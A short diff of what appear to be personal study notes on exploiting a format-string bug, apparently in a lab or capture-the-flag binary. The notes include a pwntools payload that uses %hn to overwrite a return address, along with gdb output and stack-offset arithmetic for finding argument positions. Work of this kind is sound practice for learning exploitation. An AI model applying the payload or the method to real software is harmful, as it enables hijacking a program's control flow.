@@ -270,7 +270,7 @@ payload=b"%058078d%64$hn"+p64(rip_func)
  b *func+344
 <+341>:   call   0x40129d <func>
 <+344>:   call   0x401110 <printf@plt>
-0x7ffe03718390 - 0x7ffe03717f10 = rbp -rsp = 1152/8=144
+0x7ffe03718390 - 0x7ffe03717f10 = rbp -rsp = 1152/8=144 = rbp func - rsp func
 0x7ffe49d3f530 - 0x7ffe49d3f4e0 = 80 (rbp main - rbp func)
 0x7fffad1fd4c0: "Your input is:", ' ' <repeats 26 times>, "\n%150$p\n%150$p\n"  // gef➤  x/s $rdi  = 14+26+1(new line char)=41
 
@@ -344,3 +344,8 @@ rsp            0x7ffc0af64d90
 
 (rdi-rsp)/8 + 6 + (leadin string length+padding to align)/8
 The numbwritten = the leading bytes of the text already written + any padding you add
+
+
+======================== 6 =========================================
+
+================================ 7 =================================
